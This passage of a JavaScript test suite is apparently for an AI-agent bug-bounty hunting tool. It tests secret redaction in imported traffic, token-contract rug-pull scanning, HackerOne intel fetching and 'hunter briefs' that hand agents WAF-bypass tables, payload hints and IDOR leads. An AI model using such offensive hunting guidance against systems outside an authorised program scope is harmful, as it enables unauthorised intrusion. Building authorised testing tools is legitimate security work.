    assert.equal(brief.traffic_summary.authenticated_count, 1);
    assert.match(brief.traffic_summary.recent[0].url, /\/api\/me/);
    assert.equal(brief.surface.priority, "HIGH");
    assert.ok(brief.ranking_summary.reasons.includes("imported_traffic"));
    assert.ok(brief.ranking_summary.reasons.includes("authenticated_observed_traffic"));
    assert.doesNotMatch(JSON.stringify(brief.traffic_summary), /evil\.example\.net/);
    assert.equal(fs.readFileSync(attackSurfacePath(domain), "utf8"), attackSurfaceBeforeImport);
  });
});

test("bounty_import_http_traffic redacts persisted URLs and rejected reasons", () => {
  withTempHome(() => {
    const domain = "example.com";
    const result = JSON.parse(importHttpTraffic({
      target_domain: domain,
      source: "burp",
      entries: [
        {
          method: "GET",
          url: "https://app.example.com/api/me?token=secret-token&email=user@example.com&id=123#frag",
          status: 200,
          headers: { Cookie: "sid=secret" },
        },
        {
          method: "GET",
          url: "not a url with token=secret-token",
          status: 200,
        },
      ],
    }));

    assert.equal(result.imported, 1);
    assert.equal(result.rejected, 1);
    assert.doesNotMatch(JSON.stringify(result.rejected_reasons), /secret-token/);

    const records = readTrafficRecordsFromJsonl(domain);
    assert.equal(records.length, 1);
    assert.equal(records[0].url, "https://app.example.com/api/me?token=REDACTED&email=REDACTED&id=REDACTED");
    assert.equal(records[0].path, "/api/me?token=REDACTED&email=REDACTED&id=REDACTED");
    assert.deepEqual(records[0].query_keys, ["email", "id", "token"]);
    assert.doesNotMatch(JSON.stringify(records), /secret-token|user@example\.com|id=123|frag/);
  });
});

test("redactUrlSensitiveValues redacts query values, credentials, and fragments", () => {
  assert.equal(
    redactUrlSensitiveValues("https://alice:secret@example.com/path?token=abc&id=123#frag"),
    "https://REDACTED:REDACTED@example.com/path?token=REDACTED&id=REDACTED",
  );
  assert.equal(redactUrlSensitiveValues("not a url token=abc"), "not a url token=abc");
});

test("legacy raw audit and traffic records are redacted on read", () => {
  withTempHome(() => {
    const domain = "example.com";
    appendJsonlLine(httpAuditJsonlPath(domain), {
      version: 1,
      ts: new Date().toISOString(),
      target_domain: domain,
      method: "GET",
      url: "https://example.com/callback?token=old-secret&id=123#frag",
      host: "example.com",
      path: "/callback?token=old-secret&id=123",
      status: 200,
      error: null,
      scope_decision: "allowed",
      final_url: "https://example.com/done?code=final-secret",
    });
    appendJsonlLine(trafficJsonlPath(domain), {
      version: 1,
      ts: new Date().toISOString(),
      target_domain: domain,
      source: "legacy",
      method: "GET",
      url: "https://app.example.com/api/me?session=old-secret&id=123#frag",
      host: "app.example.com",
      path: "/api/me?session=old-secret&id=123",
      status: 200,
      has_auth: true,
      header_names: ["cookie"],
      query_keys: ["id", "session"],
    });

    const auditRecords = readHttpAuditRecordsFromJsonl(domain);
    const trafficRecords = readTrafficRecordsFromJsonl(domain);
    assert.doesNotMatch(JSON.stringify({ auditRecords, trafficRecords }), /old-secret|final-secret|id=123|frag/);
    assert.equal(auditRecords[0].final_url, "https://example.com/done?code=REDACTED");
    assert.equal(trafficRecords[0].path, "/api/me?session=REDACTED&id=REDACTED");
  });
});

test("bounty_import_static_artifact stores redacted session-owned content and rejects unsafe imports", () => {
  withTempHome(() => {
    const domain = "example.com";
    const source = `
      contract RugToken {
        string public apiKey = "super-secret-token-value";
        mapping(address => bool) private _isBlacklisted;
      }
    `;

    assert.throws(
      () => importStaticArtifact({
        target_domain: domain,
        artifact_type: "evm_token_contract",
        path: "/tmp/RugToken.sol",
        content: source,
      }),
      /Path imports are not supported/,
    );
    assert.throws(
      () => importStaticArtifact({
        target_domain: domain,
        artifact_type: "evm_token_contract",
        content: "x".repeat(STATIC_ARTIFACT_MAX_CHARS + 1),
      }),
      /content exceeds static artifact cap/,
    );
    assert.throws(
      () => importStaticArtifact({
        target_domain: domain,
        artifact_type: "evm_token_contract",
        content: source,
      }),
      /Missing session state:/,
    );
    assert.throws(
      () => staticScan({ target_domain: domain, artifact_id: "SA-1" }),
      /Missing session state:/,
    );
    assert.equal(fs.existsSync(sessionDir(domain)), false);
    assert.equal(JSON.parse(initSession({ target_domain: domain, target_url: `https://${domain}` })).created, true);

    const imported = JSON.parse(importStaticArtifact({
      target_domain: domain,
      artifact_type: "evm_token_contract",
      source_name: "/tmp/RugToken.sol",
      label: "Rug token",
      surface_id: "surface-api",
      content: source,
    }));

    assert.equal(imported.artifact_id, "SA-1");
    assert.equal(imported.source_name, "RugToken.sol");
    assert.ok(imported.artifact_path.startsWith(staticArtifactImportDir(domain)));
    assert.equal(imported.artifact_path, staticArtifactPath(domain, "SA-1"));
    assert.ok(fs.existsSync(staticArtifactsJsonlPath(domain)));
    assert.ok(fs.existsSync(staticArtifactPath(domain, "SA-1")));
    assert.equal(readStaticArtifactRecordsFromJsonl(domain).length, 1);

    const stored = fs.readFileSync(staticArtifactPath(domain, "SA-1"), "utf8");
    assert.match(stored, /REDACTED/);
    assert.doesNotMatch(stored, /super-secret-token-value|\/tmp\/RugToken/);
  });
});

test("bounty_static_scan reports deduped findings separately from capped returned findings", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedSessionState(domain, { phase: "HUNT", hunt_wave: 1, pending_wave: 1 });
    const imported = JSON.parse(importStaticArtifact({
      target_domain: domain,
      artifact_type: "evm_token_contract",
      label: "Duplicate honeypot",
      content: `
        contract DuplicateHoneypot {
          function block(address account) external {
            _isBlacklisted[account] = true;
            _isBlacklisted[account] = true;
            _isBlacklisted[account] = true;
          }
        }
      `,
    }));

    const scan = JSON.parse(staticScan({
      target_domain: domain,
      artifact_id: imported.artifact_id,
      limit: 1,
    }));

    assert.equal(scan.findings_count, 1);
    assert.equal(scan.findings_returned, 1);
    assert.equal(scan.findings_capped, false);
    assert.equal(scan.findings_shown, 1);
    assert.equal(scan.findings_omitted, 0);
    assert.equal(scan.risk_score, 25);
  });
});

test("bounty_static_scan scans only imported artifacts and feeds bounded hunter brief hints", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedSessionState(domain, { phase: "HUNT", hunt_wave: 1, pending_wave: 1 });
    seedAttackSurfaces(domain, [
      {
        id: "surface-token",
        hosts: [`https://app.${domain}`],
        tech_stack: ["EVM token"],
        endpoints: ["/token"],
        interesting_params: [],
        nuclei_hits: [],
        priority: "LOW",
      },
    ]);
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-token" }]);

    const imported = JSON.parse(importStaticArtifact({
      target_domain: domain,
      artifact_type: "evm_token_contract",
      label: "Classic rug",
      source_name: "ClassicRug.sol",
      surface_id: "surface-token",
      content: `
        contract ClassicRug {
          mapping(address => bool) private _isBlacklisted;
          uint256 private _sellFee = 1;
          function blacklist(address account) external onlyOwner {
            _isBlacklisted[account] = true;
          }
          function setFees(uint256 fee) external onlyOwner {
            _sellFee = fee;
          }
          function emergencyWithdraw(address token) external onlyOwner {}
          function renounceOwnership() public override {}
          string private token = "secret-static-token";
        }
      `,
    }));

    assert.throws(
      () => staticScan({ target_domain: domain, artifact_id: "../SA-1" }),
      /artifact_id must match SA-N/,
    );
    assert.throws(
      () => staticScan({ target_domain: domain, artifact_id: "SA-999" }),
      /Static artifact SA-999 not found/,
    );

    const scan = JSON.parse(staticScan({
      target_domain: domain,
      artifact_id: imported.artifact_id,
      scan_type: "token_contract",
      limit: 10,
    }));
    assert.equal(scan.artifact_id, "SA-1");
    assert.equal(scan.chain, "evm");
    assert.ok(scan.risk_score >= 25);
    assert.match(scan.verdict, /RISK/);
    assert.ok(scan.findings.some((finding) => finding.category === "honeypot"));
    assert.ok(scan.findings.some((finding) => finding.category === "lp_drain"));
    assert.ok(fs.existsSync(staticScanResultsJsonlPath(domain)));
    assert.equal(readStaticScanResultsFromJsonl(domain).length, 1);
    assert.doesNotMatch(JSON.stringify(scan), /secret-static-token/);

    const brief = JSON.parse(readHunterBrief({ target_domain: domain, wave: "w1", agent: "a1" }));
    assert.equal(brief.static_scan_hints.available, true);
    assert.equal(brief.static_scan_hints.total_results, 1);
    assert.ok(brief.static_scan_hints.findings.length > 0);
    assert.ok(brief.static_scan_hints.findings.length <= 10);
    assert.equal(brief.static_scan_hints.artifacts[0].artifact_id, "SA-1");
    assert.doesNotMatch(JSON.stringify(brief.static_scan_hints), /secret-static-token|_isBlacklisted|evidence/);
  });
});

test("circuit breaker summary marks repeated failures per host without blocking unrelated hosts", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedSessionState(domain, { phase: "HUNT", hunt_wave: 1, pending_wave: 1 });
    seedAttackSurfaces(domain, [
      {
        id: "surface-api",
        hosts: [`https://api.${domain}`],
        tech_stack: ["Custom"],
        endpoints: ["/api"],
        interesting_params: [],
        nuclei_hits: [],
        priority: "HIGH",
      },
      {
        id: "surface-app",
        hosts: [`https://app.${domain}`],
        tech_stack: ["Custom"],
        endpoints: ["/home"],
        interesting_params: [],
        nuclei_hits: [],
        priority: "HIGH",
      },
    ]);
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-api" }]);

    for (const [host, status, error] of [
      [`api.${domain}`, 403, null],
      [`api.${domain}`, 429, null],
      [`api.${domain}`, null, "timeout after 1000ms"],
      [`app.${domain}`, 403, null],
    ]) {
      appendJsonlLine(httpAuditJsonlPath(domain), {
        version: 1,
        ts: new Date().toISOString(),
        target_domain: domain,
        method: "GET",
        url: `https://${host}/api`,
        host,
        path: "/api",
        status,
        error,
        scope_decision: error ? "request_error" : "allowed",
      });
    }

    const brief = JSON.parse(readHunterBrief({ target_domain: domain, wave: "w1", agent: "a1" }));
    assert.equal(brief.circuit_breaker_summary.tripped_count, 1);
    assert.equal(brief.circuit_breaker_summary.tripped_hosts[0].host, `api.${domain}`);
    assert.doesNotMatch(JSON.stringify(brief.circuit_breaker_summary), new RegExp(`app\\.${domain}`));
  });
});

test("bounty_public_intel caps output, persists optional intel, handles API failures, and feeds hunter brief hints", async () => {
  await withTempHome(async () => {
    const domain = "example.com";
    const previousFetch = global.fetch;
    try {
      global.fetch = async (url) => {
        const textUrl = String(url);
        if (textUrl.includes("/example-program.json")) {
          return new Response(JSON.stringify({
            handle: "example-program",
            name: "Example Program",
            policy: "Only test owned assets. Report IDOR and auth bypass with proof.",
            offers_bounties: true,
            resolved_report_count: 42,
            structured_scopes: [
              { asset_identifier: `*.${domain}`, asset_type: "URL", eligible_for_bounty: true, instruction: "Main app and API." },
            ],
          }), { status: 200, headers: { "content-type": "application/json" } });
        }
        if (textUrl.includes("hacktivity")) {
          return new Response('<a href="/reports/123">IDOR in team export</a><a href="/reports/456">GraphQL auth bypass</a>', {
            status: 200,
            headers: { "content-type": "text/html" },
          });
        }
        return new Response("no", { status: 500 });
      };

      seedSessionState(domain, { phase: "HUNT", hunt_wave: 1, pending_wave: 1 });
      seedAttackSurfaces(domain, [{
        id: "surface-api",
        hosts: [`https://app.${domain}`],
        tech_stack: ["GraphQL"],
        endpoints: ["/graphql", "/api/team/export"],
        interesting_params: ["team_id"],
        nuclei_hits: [],
        priority: "LOW",
      }]);
      seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-api" }]);
      const attackSurfaceBeforeIntel = fs.readFileSync(attackSurfacePath(domain), "utf8");

      const result = JSON.parse(await bountyPublicIntel({
        target_domain: domain,
        program: "https://hackerone.com/example-program",
        keywords: ["team export", "graphql"],
        limit: 1,
      }));
      assert.equal(result.disclosed_reports.length, 1);
      assert.equal(result.structured_scopes.length, 1);
      assert.equal(result.program_stats.resolved_report_count, 42);
      assert.match(result.policy_summary, /Only test owned assets/);
      assert.ok(fs.existsSync(publicIntelPath(domain)));
      assert.equal(fs.readFileSync(attackSurfacePath(domain), "utf8"), attackSurfaceBeforeIntel);

      const brief = JSON.parse(readHunterBrief({ target_domain: domain, wave: "w1", agent: "a1" }));
      assert.equal(brief.intel_hints.available, true);
      assert.equal(brief.intel_hints.reports.length, 1);
      assert.ok(brief.ranking_summary.reasons.includes("disclosed_report_hints"));
      assert.equal(fs.readFileSync(attackSurfacePath(domain), "utf8"), attackSurfaceBeforeIntel);

      global.fetch = async () => { throw new Error("network down"); };
      const failed = JSON.parse(await bountyPublicIntel({ target_domain: "empty.example", keywords: ["none"], limit: 2 }));
      assert.equal(failed.disclosed_reports.length, 0);
      assert.ok(failed.errors.some((error) => /network down/.test(error)));
    } finally {
      global.fetch = previousFetch;
    }
  });
});

test("public intel fetch helper enforces HackerOne allowlist and response cap", async () => {
  const previousFetch = global.fetch;
  let called = false;
  try {
    global.fetch = async () => {
      called = true;
      return new Response("abcdef", { status: 200, headers: { "content-type": "text/html" } });
    };

    await assert.rejects(
      () => fetchTextWithTimeout("https://example.com/hacktivity"),
      /not allowlisted/,
    );
    assert.equal(called, false);

    const fetched = await fetchTextWithTimeout("https://hackerone.com/hacktivity?querystring=example", {
      maxBytes: 4,
    });
    assert.equal(fetched.ok, true);
    assert.equal(fetched.text, "abcd");
    assert.equal(fetched.truncated, true);
  } finally {
    global.fetch = previousFetch;
  }
});

test("rankAttackSurfaces adds ranking fields without removing required attack_surface fields", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedAttackSurfaces(domain, [{
      id: "surface-api",
      hosts: [`https://api.${domain}`],
      tech_stack: ["REST"],
      endpoints: ["/api/v1/users/{id}", "/billing/refund"],
      interesting_params: ["user_id", "account_id"],
      nuclei_hits: ["swagger exposed"],
      priority: "LOW",
    }]);

    const before = fs.readFileSync(attackSurfacePath(domain), "utf8");
    const ranked = rankAttackSurfaces(domain);
    assert.equal(ranked.surfaces.length, 1);
    assert.ok(ranked.surfaces[0].ranking.score > 0);
    assert.ok(ranked.surfaces[0].ranking.reasons.includes("api_or_mobile_surface"));
    assert.equal(fs.readFileSync(attackSurfacePath(domain), "utf8"), before);

    rankAttackSurfaces(domain, { write: true });
    const surface = JSON.parse(fs.readFileSync(attackSurfacePath(domain), "utf8")).surfaces[0];
    for (const field of ["id", "hosts", "tech_stack", "endpoints", "interesting_params", "nuclei_hits", "priority"]) {
      assert.ok(Object.prototype.hasOwnProperty.call(surface, field), `missing ${field}`);
    }
    assert.ok(surface.ranking.score > 0);
    assert.ok(surface.ranking.reasons.includes("api_or_mobile_surface"));
    assert.ok(priorityRankForTest(surface.priority) >= priorityRankForTest("HIGH"));
  });
});

test("read-style status and hunter brief compute ranking without mutating attack_surface.json", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedSessionState(domain, { phase: "HUNT", hunt_wave: 1, pending_wave: 1 });
    seedAttackSurfaces(domain, [{
      id: "surface-api",
      hosts: [`https://api.${domain}`],
      tech_stack: ["REST"],
      endpoints: ["/api/v1/users/{id}"],
      interesting_params: ["user_id"],
      nuclei_hits: ["swagger exposed"],
      priority: "LOW",
    }]);
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-api" }]);

    const before = fs.readFileSync(attackSurfacePath(domain), "utf8");
    const brief = JSON.parse(readHunterBrief({ target_domain: domain, wave: "w1", agent: "a1" }));
    const status = JSON.parse(waveStatus({ target_domain: domain }));
    const after = fs.readFileSync(attackSurfacePath(domain), "utf8");

    assert.equal(after, before);
    assert.equal(brief.surface.priority, "HIGH");
    assert.ok(brief.ranking_summary.reasons.includes("api_or_mobile_surface"));
    assert.equal(status.coverage.unexplored_high, 1);
  });
});

function priorityRankForTest(priority) {
  return { LOW: 1, MEDIUM: 2, HIGH: 3, CRITICAL: 4 }[String(priority || "").toUpperCase()] || 0;
}

// ── bounty_read_hunter_brief tests ──

test("bounty_read_hunter_brief returns surface, exclusions, and valid IDs", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedSessionState(domain, {
      phase: "HUNT",
      hunt_wave: 1,
      pending_wave: 1,
      dead_ends: ["/api/old"],
      waf_blocked_endpoints: ["/admin"],
      scope_exclusions: ["third-party.com"],
    });
    seedAttackSurface(domain, ["surface-a", "surface-b"]);
    seedAssignments(domain, 1, [
      { agent: "a1", surface_id: "surface-a" },
      { agent: "a2", surface_id: "surface-b" },
    ]);

    const brief = JSON.parse(readHunterBrief({
      target_domain: domain,
      wave: "w1",
      agent: "a1",
    }));

    assert.equal(brief.wave, "w1");
    assert.equal(brief.agent, "a1");
    assert.equal(brief.surface.id, "surface-a");
    assert.deepEqual(brief.valid_surface_ids, ["surface-a", "surface-b"]);
    assert.deepEqual(brief.dead_ends, ["/api/old"]);
    assert.deepEqual(brief.waf_blocked_endpoints, ["/admin"]);
    assert.strictEqual(brief.scope_exclusions, undefined);
    assert.ok(brief.exclusions_summary);
    assert.equal(brief.exclusions_summary.dead_ends_total, 1);
    assert.equal(brief.exclusions_summary.waf_blocked_total, 1);
    assert.equal(brief.auth_hint, undefined);
    assert.match(brief.auth_profiles_hint, /bounty_list_auth_profiles/);
    assert.doesNotMatch(JSON.stringify(brief), /auth\.json/i);
  });
});

test("bounty_read_hunter_brief caps assigned surface arrays and reports surface_limits", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedSessionState(domain, { phase: "HUNT", hunt_wave: 1, pending_wave: 1 });
    seedAttackSurfaces(domain, [{
      id: "surface-rich",
      priority: "HIGH",
      hosts: Array.from({ length: 25 }, (_, index) => `https://h${index}.${domain}`),
      tech_stack: Array.from({ length: 25 }, (_, index) => `tech-${index}`),
      endpoints: Array.from({ length: 90 }, (_, index) => `/api/${index}`),
      interesting_params: Array.from({ length: 45 }, (_, index) => `param_${index}`),
      nuclei_hits: Array.from({ length: 35 }, (_, index) => `hit-${index}`),
      bug_class_hints: Array.from({ length: 25 }, (_, index) => `bug-${index}`),
      high_value_flows: Array.from({ length: 25 }, (_, index) => `flow-${index}`),
      evidence: Array.from({ length: 30 }, (_, index) => `evidence-${index}`),
      js_hints: Array.from({ length: 200 }, (_, index) => `js-${index}`),
      ranking: { version: 1, score: 77, priority: "HIGH", reasons: ["api_or_mobile_surface"] },
    }]);
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-rich" }]);

    const brief = JSON.parse(readHunterBrief({ target_domain: domain, wave: "w1", agent: "a1" }));
    assert.equal(brief.surface.id, "surface-rich");
    assert.equal(brief.surface.priority, "HIGH");
    assert.equal(brief.surface.ranking.version, 1);
    assert.ok(Array.isArray(brief.surface.ranking.reasons));
    assert.equal(brief.surface.hosts.length, 20);
    assert.equal(brief.surface.endpoints.length, 80);
    assert.equal(brief.surface.interesting_params.length, 40);
    assert.equal(brief.surface.nuclei_hits.length, 30);
    assert.equal(brief.surface.bug_class_hints.length, 20);
    assert.equal(brief.surface.high_value_flows.length, 20);
    assert.equal(brief.surface.evidence.length, 25);
    assert.equal(brief.surface.js_hints, undefined);
    assert.deepEqual(brief.surface_limits.hosts, { shown: 20, total: 25, omitted: 5 });
    assert.deepEqual(brief.surface_limits.endpoints, { shown: 80, total: 90, omitted: 10 });
  });
});

test("bounty_read_hunter_brief caps scalar strings and omits unknown scalar fields", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedSessionState(domain, { phase: "HUNT", hunt_wave: 1, pending_wave: 1 });
    const huge = "x".repeat(5000);
    seedAttackSurfaces(domain, [{
      id: "surface-scalar",
      hosts: [`https://${domain}`],
      tech_stack: ["Custom"],
      endpoints: [`/${huge}`],
      interesting_params: ["id"],
      priority: "HIGH",
      surface_type: huge,
      description: huge,
      recon_blob: huge,
    }]);
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-scalar" }]);

    const brief = JSON.parse(readHunterBrief({ target_domain: domain, wave: "w1", agent: "a1" }));
    assert.equal(brief.surface.surface_type.length, 80);
    assert.equal(brief.surface.description.length, 500);
    assert.equal(brief.surface.endpoints[0].length, 500);
    assert.equal(brief.surface.recon_blob, undefined);
    assert.deepEqual(brief.surface_limits.surface_type, {
      shown_chars: 80,
      total_chars: 5000,
      omitted_chars: 4920,
    });
    assert.deepEqual(brief.surface_limits.description, {
      shown_chars: 500,
      total_chars: 5000,
      omitted_chars: 4500,
    });
    assert.equal(brief.surface_limits.endpoints.truncated_values, 1);
    assert.equal(brief.surface_limits.endpoints.max_value_chars, 500);
    assert.doesNotMatch(JSON.stringify(brief), new RegExp("x{1000}"));
  });
});

test("bounty_read_hunter_brief includes assigned-surface coverage summary with latest-per-key dedupe", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedSessionState(domain, { phase: "HUNT", hunt_wave: 1, pending_wave: 1 });
    seedAttackSurface(domain, ["surface-a", "surface-b"]);
    seedAssignments(domain, 1, [
      { agent: "a1", surface_id: "surface-a" },
      { agent: "a2", surface_id: "surface-b" },
    ]);

    logCoverage({
      target_domain: domain,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
      entries: [
        {
          endpoint: "/api/v1/users/123",
          method: "get",
          bug_class: "IDOR",
          auth_profile: "attacker-victim",
          status: "tested",
          evidence_summary: "first replay returned 403",
        },
        {
          endpoint: "/api/v1/users/123",
          method: "GET",
          bug_class: "idor",
          auth_profile: "attacker-victim",
          status: "promising",
          evidence_summary: "legacy query param still returns profile metadata",
          next_step: "try export route",
        },
        {
          endpoint: "/search",
          method: "POST",
          bug_class: "xss",
          status: "blocked",
          evidence_summary: "WAF blocks reflected payloads",
        },
      ],
    });
    logCoverage({
      target_domain: domain,
      wave: "w1",
      agent: "a2",
      surface_id: "surface-b",
      entries: [{
        endpoint: "/admin",
        bug_class: "authz",
        status: "promising",
        evidence_summary: "admin path reveals feature flags",
      }],
    });

    const brief = JSON.parse(readHunterBrief({ target_domain: domain, wave: "w1", agent: "a1" }));
    assert.equal(brief.coverage_summary.surface_id, "surface-a");
    assert.equal(brief.coverage_summary.total, 2);
    assert.equal(brief.coverage_summary.shown, 2);
    assert.equal(brief.coverage_summary.omitted, 0);
    assert.deepEqual(brief.coverage_summary.tested, []);
    assert.equal(brief.coverage_summary.promising.length, 1);
    assert.equal(brief.coverage_summary.promising[0].endpoint, "/api/v1/users/123");
    assert.equal(brief.coverage_summary.promising[0].method, "GET");
    assert.equal(brief.coverage_summary.promising[0].bug_class, "idor");
    assert.equal(brief.coverage_summary.promising[0].next_step, "try export route");
    assert.equal(brief.coverage_summary.blocked.length, 1);
    assert.equal(brief.coverage_summary.blocked[0].endpoint, "/search");
    assert.doesNotMatch(JSON.stringify(brief.coverage_summary), /\/admin/);
  });
});

test("bounty_read_hunter_brief caps coverage summary output", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedSessionState(domain, { phase: "HUNT", hunt_wave: 1, pending_wave: 1 });
    seedAttackSurface(domain, ["surface-a"]);
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-a" }]);

    logCoverage({
      target_domain: domain,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
      entries: Array.from({ length: 45 }, (_, index) => ({
        endpoint: `/api/v1/items/${index}`,
        method: "GET",
        bug_class: "idor",
        status: "tested",
        evidence_summary: `item ${index} returned 403`,
      })),
    });

    const brief = JSON.parse(readHunterBrief({ target_domain: domain, wave: "w1", agent: "a1" }));
    assert.equal(brief.coverage_summary.total, 45);
    assert.equal(brief.coverage_summary.shown, 40);
    assert.equal(brief.coverage_summary.omitted, 5);
    assert.equal(brief.coverage_summary.tested.length, 40);

    const directSummary = buildCoverageSummaryForSurface(readCoverageRecordsFromJsonl(domain), "surface-a", 3);
    assert.equal(directSummary.total, 45);
    assert.equal(directSummary.shown, 3);
    assert.equal(directSummary.omitted, 42);
  });
});

test("bounty_read_hunter_brief rejects unassigned agent", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedSessionState(domain, { phase: "HUNT", hunt_wave: 1, pending_wave: 1 });
    seedAttackSurface(domain, ["surface-a"]);
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-a" }]);

    assert.throws(
      () => readHunterBrief({ target_domain: domain, wave: "w1", agent: "a9" }),
      /Agent a9 is not assigned/,
    );
  });
});

test("runtime resource resolution prefers neutral env paths and preserves Claude fallback", () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "bountyagent-resources-"));
  try {
    const neutralResources = path.join(root, "neutral-resources");
    const claudeProject = path.join(root, "claude-project");
    fs.mkdirSync(path.join(neutralResources, "knowledge"), { recursive: true });
    fs.mkdirSync(path.join(claudeProject, ".claude", "knowledge"), { recursive: true });
    fs.writeFileSync(path.join(neutralResources, "knowledge", "source.txt"), "neutral\n", "utf8");
    fs.writeFileSync(path.join(claudeProject, ".claude", "knowledge", "source.txt"), "claude\n", "utf8");

    withEnv({
      BOB_CLIENT: "codex",
      BOB_PROJECT_DIR: path.join(root, "bob-project"),
      BOB_RESOURCE_DIR: neutralResources,
      CLAUDE_PROJECT_DIR: claudeProject,
    }, () => {
      assert.equal(runtimeClient(), "codex");
      assert.equal(readResourceText("knowledge", "source.txt"), "neutral\n");
      assert.equal(resolveResourcePath("knowledge", "source.txt"), path.join(neutralResources, "knowledge", "source.txt"));
    });

    withEnv({
      BOB_CLIENT: undefined,
      BOB_PROJECT_DIR: undefined,
      BOB_RESOURCE_DIR: undefined,
      CLAUDE_PROJECT_DIR: claudeProject,
    }, () => {
      assert.equal(runtimeClient(), "claude");
      assert.equal(readResourceText("knowledge", "source.txt"), "claude\n");
      assert.equal(resolveResourcePath("knowledge", "source.txt"), path.join(claudeProject, ".claude", "knowledge", "source.txt"));
    });
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
  }
});

test("bounty_read_hunter_brief loads knowledge and bypass tables from BOB_RESOURCE_DIR", () => {
  const resources = fs.mkdtempSync(path.join(os.tmpdir(), "bountyagent-resource-dir-"));
  try {
    fs.mkdirSync(path.join(resources, "knowledge"), { recursive: true });
    fs.mkdirSync(path.join(resources, "bypass-tables"), { recursive: true });
    fs.writeFileSync(path.join(resources, "bypass-tables", "rest-api.txt"), "CUSTOM REST BYPASS TABLE\n", "utf8");
    fs.writeFileSync(path.join(resources, "knowledge", "hunter-techniques.json"), `${JSON.stringify({
      version: 1,
      entries: [{
        id: "acmecms",
        title: "AcmeCMS custom guidance",
        match: { tech: ["acmecms"] },
        techniques: ["Use the adapter-provided knowledge directory for AcmeCMS checks."],
        payload_hints: ["/acme/admin/export"],
      }],
    }, null, 2)}\n`, "utf8");

    withTempHome(() => withEnv({
      BOB_RESOURCE_DIR: resources,
      BOB_PROJECT_DIR: undefined,
      CLAUDE_PROJECT_DIR: undefined,
    }, () => {
      const domain = "example.com";
      seedSessionState(domain, { phase: "HUNT", hunt_wave: 1, pending_wave: 1 });
      seedAttackSurfaces(domain, [{
        id: "surface-custom",
        hosts: [`https://${domain}`],
        tech_stack: ["AcmeCMS"],
        endpoints: ["/acme"],
        interesting_params: ["id"],
      }]);
      seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-custom" }]);

      const brief = JSON.parse(readHunterBrief({ target_domain: domain, wave: "w1", agent: "a1" }));
      assert.equal(brief.bypass_table, "CUSTOM REST BYPASS TABLE");
      assert.deepEqual(brief.techniques.map((entry) => entry.id), ["acmecms"]);
      assert.match(JSON.stringify(brief.payload_hints), /\/acme\/admin\/export/);
    }));
  } finally {
    fs.rmSync(resources, { recursive: true, force: true });
  }
});

test("bounty_read_hunter_brief includes WordPress-specific curated guidance", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedSessionState(domain, { phase: "HUNT", hunt_wave: 1, pending_wave: 1 });
    seedAttackSurfaces(domain, [{
      id: "surface-wp",
      hosts: [`https://${domain}`],
      tech_stack: ["WordPress", "PHP"],
      endpoints: ["/wp-json/wp/v2/users", "/wp-admin/admin-ajax.php"],
      interesting_params: ["author", "action", "nonce"],
    }]);
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-wp" }]);

    const brief = JSON.parse(readHunterBrief({ target_domain: domain, wave: "w1", agent: "a1" }));
    assert.ok(brief.techniques.some((entry) => entry.id === "wordpress"));
    assert.ok(brief.payload_hints.some((entry) => entry.id === "wordpress"));
    assert.match(JSON.stringify(brief.techniques), /WordPress/);
  });
});

test("bounty_read_hunter_brief includes GraphQL-specific curated guidance", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedSessionState(domain, { phase: "HUNT", hunt_wave: 1, pending_wave: 1 });
    seedAttackSurfaces(domain, [{
      id: "surface-graphql",
      hosts: [`https://${domain}`],
      tech_stack: ["GraphQL", "Apollo"],
      endpoints: ["/graphql"],
      interesting_params: ["query", "variables", "operationName"],
    }]);
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-graphql" }]);

    const brief = JSON.parse(readHunterBrief({ target_domain: domain, wave: "w1", agent: "a1" }));
    assert.ok(brief.techniques.some((entry) => entry.id === "graphql"));
    assert.match(JSON.stringify(brief.payload_hints), /alias|updateUserRole|__schema/i);
  });
});

test("bounty_read_hunter_brief includes generic REST/API guidance for API surfaces", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedSessionState(domain, { phase: "HUNT", hunt_wave: 1, pending_wave: 1 });
    seedAttackSurfaces(domain, [{
      id: "surface-api",
      hosts: [`https://api.${domain}`],
      tech_stack: ["Express", "JSON API"],
      endpoints: ["/api/v1/users/123", "/api/v2/admin/export"],
      interesting_params: ["id", "user_id", "role", "limit"],
    }]);
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-api" }]);

    const brief = JSON.parse(readHunterBrief({ target_domain: domain, wave: "w1", agent: "a1" }));
    assert.ok(brief.techniques.some((entry) => entry.id === "generic-rest-api"));
    assert.match(JSON.stringify(brief.techniques), /object access|parser differentials|old API versions/i);
  });
});

test("bounty_read_hunter_brief matches IDOR and authz bug_class_hints to REST/API authorization guidance", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedSessionState(domain, { phase: "HUNT", hunt_wave: 1, pending_wave: 1 });
    seedAttackSurfaces(domain, [{
      id: "surface-object-access",
      hosts: [`https://app.${domain}`],
      tech_stack: ["Custom"],
      endpoints: ["/dashboard"],
      interesting_params: ["q"],
      bug_class_hints: ["idor", "authz"],
      evidence: ["archived export URL exposed account_id and org_id"],
    }]);
